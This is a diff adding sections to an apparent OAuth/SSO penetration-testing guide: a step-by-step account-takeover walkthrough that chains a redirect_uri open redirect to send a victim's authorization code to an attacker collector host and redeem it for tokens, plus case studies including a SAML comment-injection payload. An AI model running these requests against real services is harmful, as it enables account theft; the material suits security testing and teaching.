@@ -120,6 +120,66 @@ redirect_uri=https://app.example.com/callback&redirect_uri=https://evil.com/
 
 → **Impact:** steal `code` → exchange at `/token` (if you also have/guessed the client auth, or the client is public/PKCE-less) → victim's tokens → **ATO**. Steal `access_token`/`id_token` directly (implicit) → **ATO**.
 
+## 2.1.1 The full attack, end-to-end — `redirect_uri` + open-redirect-on-allowed-host → steal the code → ATO (worked transcript) ⭐
+
+> *This is the flagship worked example* — the #1 OAuth bug on the wire, using the technique that actually beats **strict** `redirect_uri` allow-lists in the real world: an **open redirect on the allowed origin**. (A naive suffix bypass is the easy case; this is the one that pays.) Two own accounts, benign marker host, capture only my *own* code first to rehearse; then prove victim-code theft against my second account.
+
+**Target.** `app.example.com` uses "Sign in with Google" (authorization-code flow). The client is public/PKCE-less (an SPA). Goal: land a victim's `code` on a host I control and redeem it.
+
+**Step 1 — capture the legitimate flow (§1).** Click "Sign in with Google" and read the authorization request the app builds:
+```
+GET https://accounts.google.com/o/oauth2/v2/auth
+   ?client_id=1234.apps.googleusercontent.com
+   &redirect_uri=https://app.example.com/oauth/callback
+   &response_type=code
+   &scope=openid%20email
+   &state=8f3a...   HTTP/1.1
+```
+On success Google 302s the browser to `https://app.example.com/oauth/callback?code=<CODE>&state=8f3a...`, and the app exchanges `<CODE>` at Google's `/token`. My target is `<CODE>`.
+
+**Step 2 — probe `redirect_uri` (it's strict).** I try the cheap bypasses first:
+```
+redirect_uri=https://app.example.com.evil.com/cb   → Google: "redirect_uri_mismatch"   (suffix anchored — good)
+redirect_uri=https://app.example.com@evil.com/cb   → mismatch
+redirect_uri=https://evil.com/cb                    → mismatch
+```
+Strict exact-match. So the code *must* land on `app.example.com` — I need something on that origin that forwards it to me.
+
+**Step 3 — find an open redirect ON the allowed origin (§2.1, the pivot).** I crawl `app.example.com` and find a marketing redirector:
+```
+https://app.example.com/out?url=https://anywhere.com   → 302 Location: https://anywhere.com
+```
+An open redirect on the *allowed* host. Now I point the OAuth `redirect_uri` at a callback path that itself bounces through `/out`:
+```
+redirect_uri=https://app.example.com/oauth/callback?next=https://app.example.com/out?url=https://evil-collector.oast.fun
+```
+(Where the app's own callback forwards to `next` — or, if the callback strips params, I target `/out` directly as the `redirect_uri` if the allow-list matches on host+prefix.) The key: the `redirect_uri` **host is `app.example.com`**, so Google accepts it, but the page it lands on forwards the browser — carrying `?code=` — off-origin.
+
+**Step 4 — the code leaks to my collector.** The victim (my second test account, logged into Google) clicks my crafted "Sign in" link. Google authenticates them and 302s the code to the allowed host, which forwards to my collector:
+```
+[evil-collector] GET /?code=4/0Ax...VICTIM_CODE&state=8f3a...   from 203.0.113.9 (victim browser)   14:22:07
+```
+Even without a redirector, the **Referer leak** works: if the real callback page loads any third-party resource (analytics/`<img>`) before stripping the URL, the full `?code=` URL leaks in the `Referer` to that third party. Either way, **I now hold the victim's authorization code.**
+
+**Step 5 — redeem the code → tokens → ATO (§2.3/§2.4).** The client is public/PKCE-less, so I exchange the code directly:
+```http
+POST /token HTTP/1.1
+Host: oauth2.googleapis.com
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code&code=4/0Ax...VICTIM_CODE
+&client_id=1234.apps.googleusercontent.com&redirect_uri=https://app.example.com/oauth/callback
+```
+```
+HTTP/1.1 200 OK
+{"access_token":"ya29...","id_token":"eyJ...","expires_in":3599}
+```
+The `id_token` decodes to the victim's `email`/`sub`; presenting the `access_token`/`id_token` to `app.example.com` logs me in as **them** — full account takeover. (If PKCE were enforced, Step 5 fails without the `code_verifier` — see §2.4 for the downgrade/omission tests that re-open it.)
+
+**Step 6 — prove benignly, then STOP.** I demonstrate "as attacker I logged into my *second* test account B via B's stolen code," screenshot `/api/me` showing B's identity, and stop — no real user's code is ever captured, the collector is my own host, and I tear it down.
+
+**Why this is the OAuth-defining bug.** The IdP's job is to mail the login credential *only* to the app. Every OAuth ATO is a way to make it mail the credential somewhere you can read — a loose allow-list, or (the money variant) an **open redirect on the allowed origin** that the strict check can't see past. One `redirect_uri` you influenced, one code, one token exchange = the victim's account.
+
 ## 2.2 `state` — CSRF on the OAuth flow / forced login (login CSRF → stealthy ATO)
 
 `state` is the OAuth CSRF token binding the callback to the user who started the flow. Test:
@@ -302,6 +362,20 @@ If you obtain the IdP's **token-signing private key** (e.g., ADFS `AD FS` key fr
 | Implicit-flow token in fragment + any open redirect | Exfiltrate `access_token` → API access as victim. | High |
 
 **Chaining map:** [../JWT/](../JWT/) (id_token forgery, jku/kid) · [../XXE/](../XXE/) (SAML parser) · [../SSRF/](../SSRF/) (`request_uri`, metadata) · open-redirect on the client (code exfil) · [../CSRF/](../CSRF/) (login/link CSRF) · [../CORS/](../CORS/) (token endpoint / userinfo readable cross-origin).
+
+---
+
+# PART IV.1 — Real-world SSO case studies (verified)
+
+> Re-verified against primary sources (linked in §5.5) — the named events behind the techniques above, one per protocol layer.
+
+- **"Sign in with Apple" full ATO (Bhavuk Jain, 2020, $100,000) — the OIDC id_token-validation bug (§2.7).** Apple's Sign in with Apple would, after authenticating a user, issue a **JWT (`id_token`) for *any* email address the client requested** — and those tokens verified correctly against Apple's public key. So an attacker could ask Apple for a token asserting the *victim's* email, and any third-party app that trusted "a validly-signed Apple id_token for this email = this user" logged them in as the victim. Affected the huge SIWA ecosystem (Dropbox, Spotify, Airbnb, Giphy). It's the canonical proof of the §2.7 rule: **verify the signature *and* pin who's allowed to assert the identity** — a valid signature on an attacker-chosen `email`/`sub` is still a forgery. Apple patched it and found no in-the-wild abuse.
+
+- **Duo Labs SAML comment-injection (2018) — CVE-2017-11427/11428/11429/11430, the "`<!---->`" ATO (§3.3).** Duo found a *class* of bugs across major SAML toolkits (OneLogin **python-saml** 11427, **ruby-saml** 11428, **saml2-js** 11429, **OmniAuth-SAML** 11430): XML **canonicalization strips comments before signature verification**, so inserting a comment into the `NameID` doesn't invalidate the signature — but the SP's DOM-traversal API reads only the text *after* the comment (or drops it), so `admin@target.com<!---->.evil.com` verifies as signed yet is parsed as `admin@target.com`. Result: **authentication bypass as another user without breaking the signature.** It's why §3.3 exists and why SAML SPs must extract the NameID with a comment-safe API. A broad, multi-CVE class — test every SAML SP for it.
+
+- **Missing `state` → account-linking CSRF is the recurring `state` bug (RFC 6749 §10.12; §2.2).** The OAuth spec mandates `state` precisely because, without it, an attacker who captures *their own* "link Google" `code` and feeds it to a logged-in victim silently links the **attacker's** identity to the **victim's** account → attacker signs in via Google → inside the victim's account. It's one of the most-reported OAuth findings on bug-bounty programs because "connect a social account" features frequently ship with `state` missing or unchecked. Lesson: on any account-linking flow, the *first* test is whether `state` is present, session-bound, and single-use.
+
+- **Unverified-email account-linking / pre-account-takeover (Sudhodanan & Paverd, USENIX Security 2022; §2.9).** The academic study that named the class found **35 of 75** popular services vulnerable to pre-hijacking: an attacker pre-registers the victim's email (unverified), and when the victim later signs up via SSO the app *merges* the SSO identity into the attacker's pre-existing record instead of creating a fresh one — so the attacker retains access. It's the "money bug" of OAuth because it's often **zero-click** for the victim and survives password resets. Cross-referenced with the AccountTakeover kit; the fix is to require email verification before *any* linking/merge.
 
 ---
 
